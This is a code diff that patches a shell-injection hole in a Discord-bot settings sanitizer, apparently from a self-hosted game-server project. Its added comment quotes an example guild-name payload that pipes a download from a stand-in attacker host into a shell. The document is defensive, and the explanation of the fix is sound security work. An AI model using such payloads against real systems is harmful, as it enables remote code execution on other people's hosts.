@@ -112,9 +112,28 @@ export function readDiscordBotSettingsState(config) {
 // literal newline was never traced. Reject control characters, "=", and
 // newlines/CR explicitly, as defense-in-depth independent of the loader's
 // actual behavior, rather than trusting quoteEnv() alone.
+//
+// dune-awakening-selfhost-docker#870 (CRITICAL, found by automated review
+// on #801 after that PR had already merged): the control-chars-and-"="
+// blocklist above left `$` and backtick completely untouched. quoteEnv()'s
+// JSON.stringify() only escapes '"', '\\', and control characters, so a
+// guild name like `Evil$(curl attacker.example|sh)Server` was written
+// verbatim into a double-quoted .env line. runtime/scripts/start-all.sh
+// (and sibling scripts) `. ./.env` that file inside `set -a; ...; set +a`
+// -- a real bash *source*, not a passive read -- so that payload executed
+// as a real shell command with the script's own privileges. The attacker
+// here is not the console operator: it's any Discord user with Manage
+// Server permission in a guild the operator merely owns/administers, so
+// this was a genuine Discord-side-actor-to-host-RCE privilege boundary
+// crossing, not a self-harm scenario. Switched from a blocklist to an
+// ALLOWLIST -- this value is display-only (never used for authorization,
+// see this function's own callers), so keeping only Unicode letters,
+// digits, whitespace, and a small, genuinely-safe punctuation set is
+// categorically safer than trying to enumerate every shell metacharacter
+// (`$`, backtick, parens, brackets, braces, quotes, `;`, `|`, `&`, `<`,
+// `>`, `\`, `=`, `~`, `*` are all excluded by construction, not by name).
 function sanitizeEnvDisplayValue(value) {
-  // eslint-disable-next-line no-control-regex
-  return value.replace(/[\x00-\x1f\x7f=]/g, "");
+  return value.replace(/[^\p{L}\p{N}\s.,'!?_-]/gu, "");
 }
 
 export function persistHostedBotConnectedGuild(config, { guildId, guildName } = {}) {
